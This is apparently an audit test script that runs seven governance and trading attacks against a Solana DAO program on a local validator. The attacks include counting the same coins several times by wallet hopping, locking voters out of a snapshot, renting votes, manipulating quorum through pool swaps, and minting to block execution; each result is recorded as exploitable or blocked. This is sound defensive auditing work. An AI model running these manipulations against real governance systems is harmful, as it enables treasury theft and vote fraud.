// A2 — voting integrity and buy/sell abuse.  Attacks that a trader / holder can run WITHOUT the owner's key.
// Here "EXPLOITABLE" = the attack achieved its goal on the real bytecode.
//   ANCHOR_PROVIDER_URL=http://127.0.0.1:8899 npx ts-node audit/a2_voting_trading.ts
import { Transaction } from "@solana/web3.js";
import { createMintToInstruction } from "@solana/spl-token";
import { makeWorld, group, record, TP, COIN, SOL, finish, errText, sendSigned } from "./lib";

const coins = (n: bigint) => n / COIN;
const fmtSol = (l: bigint) => (Number(l) / 1e9).toFixed(4);

async function main() {
  group("A2 voting integrity + trading");
  const QBPS = 300n; // quorum(spend) 3%
  const w = await makeWorld({ name: "a2", params: { cooldown: 0, vote: 14, timelock: 6, quorumSpendBps: Number(QBPS) } });
  const A = await w.holder(200_000_000n, 20); // the attacker's real stack: 20%
  const B = await w.holder(60_000_000n, 20); // honest, 6%
  const D = await w.holder(150_000_000n, 20); // honest, 15%
  await w.seedTreasury(5n * SOL);
  await w.withPool(300_000_000n, 30n * SOL);

  // live "does this many votes clear the quorum right now?" — the same formula the program uses
  const baseNow = async () => (await w.supplyNow()) - (await w.bal(await w.poolVaultA()));
  const quorumMetNow = async (votes: bigint) => votes * 10_000n >= (await baseNow()) * QBPS;

  const base0 = await baseNow();
  record("A2.0", "world: 1B coins, 30% in the pool, quorum(spend)=3% of the voting base", "INFO", `base=${coins(base0)} coins, quorum=${coins((base0 * QBPS) / 10_000n)} coins`);

  // ------------------------------------------------------------------------------------------------
  // A2.1  wallet hopping: the SAME 200M coins are counted three times
  // ------------------------------------------------------------------------------------------------
  const A2 = await w.holder(0n, 5);
  const A3 = await w.holder(0n, 5); // ends up holding A's 200M after the hops
  {
    const p = await w.propose(0, A.publicKey, SOL / 50n, 0, "pay A 0.02 SOL");
    await w.snapshot(p.id, p.pPda, A.publicKey); // weight 200M
    await w.transferCoins(A, A2.publicKey, 200_000_000n); // …the attacker slips a transfer between two owner transactions
    await w.snapshot(p.id, p.pPda, A2.publicKey); // weight 200M again
    await w.transferCoins(A2, A3.publicKey, 200_000_000n);
    await w.snapshot(p.id, p.pPda, A3.publicKey); // and again
    await w.snapshot(p.id, p.pPda, B.publicKey);
    await w.snapshot(p.id, p.pPda, D.publicKey);
    await w.vote(A, p.id, p.pPda, true);
    await w.vote(A2, p.id, p.pPda, true);
    await w.vote(A3, p.id, p.pPda, true);
    await w.vote(B, p.id, p.pPda, false);
    await w.vote(D, p.id, p.pPda, false);
    const pr = await w.proposalOf(p.pPda);
    const f = BigInt(pr.votesFor.toString()), ag = BigInt(pr.votesAgainst.toString());
    await w.waitExecutable(p.pPda);
    let executed = false;
    try { await w.execute(p.id, { recipient: w.tAta(A.publicKey) }); executed = true; } catch (e) { /* stays false */ }
    record(
      "A2.1",
      "wallet hopping between two owner snapshot transactions: 200M real coins voted three times",
      executed ? "EXPLOITABLE" : "BLOCKED",
      `counted for=${coins(f) / 1_000_000n}M vs against=${coins(ag) / 1_000_000n}M, though A really owns 200M (honest tally: 200M vs 210M = REJECTED). Counted weight = ${(Number(f / COIN) / 200e6).toFixed(1)}× his real stack. Proposal executed=${executed}`
    );
  }

  // control for A2.1: the same three actors, NO hopping → the proposal is rejected, as the honest tally says
  {
    const c = await w.propose(0, A3.publicKey, SOL / 50n, 0, "control: same vote without hopping");
    for (const k of [A3, B, D]) await w.snapshot(c.id, c.pPda, k.publicKey);
    await w.vote(A3, c.id, c.pPda, true);
    await w.vote(B, c.id, c.pPda, false);
    await w.vote(D, c.id, c.pPda, false);
    await w.waitExecutable(c.pPda);
    let rejected = false;
    try { await w.execute(c.id, { recipient: w.tAta(A3.publicKey) }); } catch (e) { rejected = /ProposalRejected/.test(errText(e)); }
    record("A2.1c", "control: without hopping the same 200M-vs-210M vote is REJECTED (so the hop is what flipped A2.1)", rejected ? "OK" : "ERROR", `rejected=${rejected}`);
  }

  // ------------------------------------------------------------------------------------------------
  // A2.2  electorate lock-out: the first snapshotted voter votes at once, nobody else can be added
  // ------------------------------------------------------------------------------------------------
  const Aw = await w.holder(200_000_000n, 20); // a fresh 20% whale (A2.1 moved A's coins away)
  {
    const q = await w.propose(0, Aw.publicKey, SOL / 2n, 0, "pay 0.5 SOL (lock-out)");
    await w.snapshot(q.id, q.pPda, Aw.publicKey);
    await w.vote(Aw, q.id, q.pPda, true); // he votes the moment his snapshot exists
    let lockedD = false, lockedB = false;
    try { await w.snapshot(q.id, q.pPda, D.publicKey); } catch (e) { lockedD = /VotingAlreadyStarted/.test(errText(e)); }
    try { await w.snapshot(q.id, q.pPda, B.publicKey); } catch (e) { lockedB = /VotingAlreadyStarted/.test(errText(e)); }
    await w.waitExecutable(q.pPda);
    let executed = false;
    try { await w.execute(q.id, { recipient: w.tAta(Aw.publicKey) }); executed = true; } catch (e) { /* */ }
    record(
      "A2.2",
      "electorate lock-out: first snapshotted voter votes immediately → D (15%) and B (6%) can never get a snapshot",
      lockedD && lockedB && executed ? "EXPLOITABLE" : "BLOCKED",
      `D locked out=${lockedD}, B locked out=${lockedB}; proposal (0.5 SOL out of the treasury) executed with only the whale's vote=${executed}`
    );
  }

  // control for A2.2: if D and B are snapshotted BEFORE anyone votes, the same 200M-vs-210M vote is rejected
  {
    const whale = Aw;
    const c = await w.propose(0, whale.publicKey, SOL / 2n, 0, "control: full electorate");
    for (const k of [whale, D, B]) await w.snapshot(c.id, c.pPda, k.publicKey);
    await w.vote(whale, c.id, c.pPda, true);
    await w.vote(D, c.id, c.pPda, false);
    await w.vote(B, c.id, c.pPda, false);
    await w.waitExecutable(c.pPda);
    let rejected = false;
    try { await w.execute(c.id, { recipient: w.tAta(whale.publicKey) }); } catch (e) { rejected = /ProposalRejected/.test(errText(e)); }
    record("A2.2c", "control: with the whole electorate enrolled first, the same vote is REJECTED (so the lock-out is what flipped A2.2)", rejected ? "OK" : "ERROR", `rejected=${rejected}`);
  }

  // ------------------------------------------------------------------------------------------------
  // A2.3  vote rental: buy in the pool → owner posts the snapshot → sell everything → vote
  // ------------------------------------------------------------------------------------------------
  {
    const X = await w.holder(0n, 200);
    const v0 = await w.solOf(X.publicKey);
    await w.swap(X, "buy", 8n * SOL);
    const held = await w.bal(w.ata(X.publicKey));
    const r = await w.propose(0, w.me, 1000n, 0, "rent-a-vote test");
    await w.snapshot(r.id, r.pPda, X.publicKey);
    await w.swap(X, "sell", coins(held));
    const left = await w.bal(w.ata(X.publicKey));
    await w.vote(X, r.id, r.pPda, true);
    const v1 = await w.solOf(X.publicKey);
    const pr = await w.proposalOf(r.pPda);
    const vf = BigInt(pr.votesFor.toString());
    const cost = v0 - v1;
    record(
      "A2.3",
      "buy → owner snapshots → sell everything → still votes with the full weight",
      vf >= held - COIN && left < COIN ? "EXPLOITABLE" : "BLOCKED",
      `weight counted=${coins(vf) / 1_000_000n}M coins (${(Number(vf) / Number(w.supply) * 100).toFixed(2)}% of supply) while he holds ${left} afterwards. Cost of renting them = ${fmtSol(cost)} SOL (${(Number(cost) / 8e9 * 100).toFixed(1)}% of the 8 SOL he spent buying; both 5% fees + slippage)`
    );
  }

  // ------------------------------------------------------------------------------------------------
  // A2.4  quorum veto through the pool: a passed vote is blocked by buying coins out of the pool
  // ------------------------------------------------------------------------------------------------
  {
    const base = await baseNow();
    const quorum = (base * QBPS) / 10_000n; // base units
    const weight = coins(quorum) + 100_000n; // 0.1M coins above the bar (~0.5% margin)
    const Dq = await w.holder(weight, 5);
    const s = await w.propose(0, w.me, 1000n, 0, "quorum-veto test");
    await w.snapshot(s.id, s.pPda, Dq.publicKey);
    await w.vote(Dq, s.id, s.pPda, true);
    await w.waitExecutable(s.pPda);
    const Y = await w.holder(0n, 200);
    const v0 = await w.solOf(Y.publicKey);
    // buy coins out of the pool until the vote no longer clears the (live) quorum
    let buys = 0;
    while (await quorumMetNow(weight * COIN)) {
      await w.swap(Y, "buy", SOL / 4n);
      if (++buys > 20) throw new Error("could not push the base far enough");
    }
    const held = await w.bal(w.ata(Y.publicKey));
    let vetoed = false;
    try { await w.execute(s.id, { recipient: w.tAta(w.me) }); } catch (e) { vetoed = /QuorumNotReached/.test(errText(e)); }
    await w.swap(Y, "sell", coins(held));
    let passesAfter = false;
    try { await w.execute(s.id, { recipient: w.tAta(w.me) }); passesAfter = true; } catch (e) { /* */ }
    const v1 = await w.solOf(Y.publicKey);
    record(
      "A2.4",
      "quorum veto: after the vote passed, a trader BUYS coins out of the pool → QuorumNotReached; sells back → executes",
      vetoed && passesAfter ? "EXPLOITABLE" : "BLOCKED",
      `voter had ${weight} coins vs quorum ${coins(quorum)} (margin 0.5%); the attacker only had to pull ${coins(held)} coins (${(Number(held) / Number(base) * 100).toFixed(2)}% of the base) out of the pool; the whole veto cost him ${fmtSol(v0 - v1)} SOL; after he sold back the same proposal executed=${passesAfter}`
    );
  }

  // ------------------------------------------------------------------------------------------------
  // A2.5  the reverse: a proposal short of quorum is pushed over the line by DUMPING coins into the pool
  // ------------------------------------------------------------------------------------------------
  {
    const base = await baseNow();
    const quorum = (base * QBPS) / 10_000n;
    const weight = coins(quorum) - 50_000n; // 0.05M coins SHORT of quorum
    const D2 = await w.holder(weight, 5);
    const S = await w.holder(3_000_000n, 50); // a seller with 3M coins
    const s = await w.propose(0, w.me, 1000n, 0, "quorum-push test");
    await w.snapshot(s.id, s.pPda, D2.publicKey);
    await w.vote(D2, s.id, s.pPda, true);
    await w.waitExecutable(s.pPda);
    let shortBefore = false;
    try { await w.execute(s.id, { recipient: w.tAta(w.me) }); } catch (e) { shortBefore = /QuorumNotReached/.test(errText(e)); }
    await w.swap(S, "sell", 3_000_000n);
    const metAfter = await quorumMetNow(weight * COIN);
    let passesAfter = false;
    try { await w.execute(s.id, { recipient: w.tAta(w.me) }); passesAfter = true; } catch (e) { /* */ }
    record(
      "A2.5",
      "quorum push: proposal is 0.05M coins short; a holder SELLS 3M coins into the pool → base shrinks → it now passes",
      shortBefore && passesAfter ? "EXPLOITABLE" : "BLOCKED",
      `short of quorum before=${shortBefore}; quorum met after the dump=${metAfter}; executed=${passesAfter}`
    );
  }

  // ------------------------------------------------------------------------------------------------
  // A2.6  proposal threshold with borrowed coins: buy → create proposal → sell
  // ------------------------------------------------------------------------------------------------
  {
    const X2 = await w.holder(0n, 200);
    const v0 = await w.solOf(X2.publicKey);
    await w.swap(X2, "buy", 2n * SOL); // ≈ 1.3% of supply (> 1% of the base)
    let created = false, err = "";
    try { await w.propose(0, X2.publicKey, (5n * SOL * 20n) / 100n, 0, "flash proposer", X2); created = true; } catch (e) { err = errText(e).slice(0, 160); }
    const held = await w.bal(w.ata(X2.publicKey));
    await w.swap(X2, "sell", coins(held));
    const left = await w.bal(w.ata(X2.publicKey));
    const v1 = await w.solOf(X2.publicKey);
    record(
      "A2.6",
      "create a proposal with coins that are sold right afterwards (threshold is checked on the LIVE balance)",
      created && left < COIN ? "EXPLOITABLE" : "BLOCKED",
      `created=${created} ${err}; holds ${left} afterwards; total cost incl. rent and both 5% fees=${fmtSol(v0 - v1)} SOL`
    );
  }

  // ------------------------------------------------------------------------------------------------
  // A2.7  whoever holds the MINT AUTHORITY rewrites the quorum (supply is read live at execute time)
  // ------------------------------------------------------------------------------------------------
  {
    const t = await w.propose(0, w.me, 1000n, 0, "mint-authority veto test");
    await w.snapshot(t.id, t.pPda, Aw.publicKey);
    await w.vote(Aw, t.id, t.pPda, true);
    await w.waitExecutable(t.pPda);
    const before = await w.supplyNow();
    await sendSigned(new Transaction().add(createMintToInstruction(w.mint.publicKey, w.myAta, w.me, 10_000_000_000n * COIN, [], TP)), [w.payer]);
    const after = await w.supplyNow();
    let blocked = false;
    try { await w.execute(t.id, { recipient: w.tAta(w.me) }); } catch (e) { blocked = /QuorumNotReached/.test(errText(e)); }
    record(
      "A2.7",
      "mint authority still alive: minting 10B new coins makes a passed proposal fail its quorum (and would give the minter any majority)",
      blocked ? "EXPLOITABLE" : "BLOCKED",
      `supply ${coins(before)} → ${coins(after)} coins; execute → QuorumNotReached=${blocked}`
    );
  }

  finish("audit/results_a2.json");
}
main().catch((e) => { console.error(e); process.exit(1); });
